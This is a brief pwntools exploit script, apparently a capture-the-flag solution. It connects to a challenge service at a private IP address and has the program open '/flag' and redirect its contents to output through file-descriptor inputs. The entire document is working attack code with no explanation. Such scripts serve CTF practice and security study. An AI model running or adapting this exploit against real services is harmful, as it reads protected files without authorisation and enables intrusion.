from pwn import *
#s=process("./fd")
s=remote("192.168.3.253",53000)
s.sendafter(b"open: ",b"/flag")
s.sendlineafter(b"from: ",b"1")
s.sendlineafter(b"to: ",b"2")
s.interactive()